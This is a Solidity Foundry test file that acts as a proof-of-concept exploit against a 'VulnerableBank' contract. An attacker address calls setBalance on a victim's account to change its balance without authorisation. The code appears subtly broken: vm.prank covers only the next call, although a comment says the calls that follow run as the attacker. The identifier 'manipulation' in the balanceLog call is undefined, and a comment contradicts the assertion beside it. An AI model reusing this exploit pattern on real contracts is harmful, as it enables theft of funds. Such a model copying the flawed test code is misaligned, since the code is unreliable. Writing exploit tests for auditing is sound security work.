// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
    }

    function testExploit() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // Start prank with the attacker
        vm.prank(attacker);

        // Step 1: Demonstrate normal functionality by transferring funds between accounts
        target.deposit();
        uint256 initialBalance = target.balances(victim);
        assertEq(initialBalance, 0); // Assuming deposit sets sender's balance to initial value

        address anotherVictim = makeAddr("anotherVictim");
        target.transfer(100, anotherVictim);
        assertEq(target.balances(anotherVictim), 100);

        // Step 2: Use the attacker's account to call setBalance on the victim's account
        target.setBalance(victim, 1000);

        // Validate that the balance has been changed by the attacker without authorization
        uint256 manipulatedBalance = target.balances(victim);
        assertEq(manipulatedBalance, 1000);
        require(initialBalance != manipulatedBalance, "Initial and manipulated balances must not be equal.");
        balanceLog(attacker, this, manipulation, manipulatedBalance - initialBalance);
    }
}